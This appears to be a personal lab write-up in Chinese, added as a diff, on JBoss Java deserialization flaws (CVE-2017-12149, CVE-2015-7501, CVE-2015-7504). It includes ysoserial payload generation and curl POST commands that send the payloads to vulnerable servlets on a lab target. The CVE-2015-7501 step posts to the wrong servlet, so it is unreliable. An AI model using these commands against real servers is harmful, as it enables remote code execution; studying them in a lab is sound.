@@ -1,0 +1,161 @@
+# JBOSS常见反序列化漏洞
+
+JBoss是一个用来运行 Java 企业应用的服务器，它和 Tomcat 一样，都是“跑 Java 程序”的中间件；
+ 但它通常比 Tomcat 更重、更全、更企业级。
+
+<br>
+
+## 前言：
+
+**JBoss 这几个经典漏洞虽然编号不同，但本质上都很相似，都是 JBoss 自带的某个 Servlet 或服务接口对外暴露后，反序列化了攻击者可控的 Java 对象，最终触发 gadget chain 导致 RCE。主要区别在于具体的入口组件不同，比如 JMXInvokerServlet、HTTPServerILServlet 或其他历史服务组件**
+
+<br>
+
+## CVE-2017-12149（反序列化漏洞）
+
+### 影响版本
+
+#### JBoss 5.x/6.x
+
+<br>
+
+### 攻击链
+
+**很简单**
+
+```
+攻击者访问 JBoss 暴露的危险接口
+↓
+恶意序列化对象进入 readObject
+↓
+触发 gadget chain
+↓
+RCE
+```
+
+<br>
+
+### 漏洞原理
+
+该漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260421214430.png)
+
+<br>
+
+### 复现过程
+
+并且没有任何的限制，所以我们可以用常规java反序列化的方法来打
+
+<br>
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260421220835.png)
+
+测试写入文件，先用ysoserial生成payload
+
+```
+ysoserial CommonsCollections1 "touch /tmp/test" > test.ser
+```
+
+然后直接复制test.ser的内容，post发送
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260421225404.png)
+
+
+
+但是docker里找不到我们写入的文件，尝试了好多遍依旧失败mad
+
+猜测是windows的问题，然后跑去kali上试，靶机仍开在物理机
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260421232239.png)
+
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'touch /tmp/test' > poc.ser 
+
+curl http://192.168.5.57:8080/invoker/readonly  --data-binary  @poc.ser
+```
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260421232314.png)
+
+
+
+终于成功写入文件**test**
+
+<br>
+
+<br>
+
+<br>
+
+## CVE-2015-7501(JBoss JMXInvokerServlet 反序列化漏洞)
+
+### 攻击链
+
+```
+/invoker/JMXInvokerServlet
+↓
+readObject
+↓
+gadget chain
+↓
+RCE
+```
+
+
+
+### 漏洞原理
+
+> CVE-2015-7501 是 JBoss 的 `JMXInvokerServlet` 组件存在的 Java 反序列化漏洞，攻击者可向这个 Servlet 发送恶意序列化对象，服务端在反序列化时触发 gadget chain，最终导致 RCE。
+
+
+
+### 复现过程
+
+整体复现过程和CVE-2017-12149几乎一样
+
+```
+docker compose up -d  开启容器
+```
+
+```
+java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "touch /tmp/gola" > poc.ser
+```
+
+```
+curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser
+```
+
+
+
+
+
+## CVE-2015-7504
+
+### 攻击链
+
+```
+/jbossmq-httpil/HTTPServerILServlet
+↓
+readObject
+↓
+gadget chain
+↓
+RCE
+```
+
+### 漏洞原理
+
+> 漏洞位于 `HTTPServerILServlet.java`，这是 JBossMQ 里 **JMS over HTTP Invocation Layer** 的一部分。NVD 对它的描述是：该组件**没有限制它会反序列化哪些类**，因此远程攻击者可以通过特制的序列化数据执行任意代码
+
+### 复现过程
+
+同上
+
+只是post接口为/jbossmq-httpil/HTTPServerILServlet
+
+
+
+
+
+
+
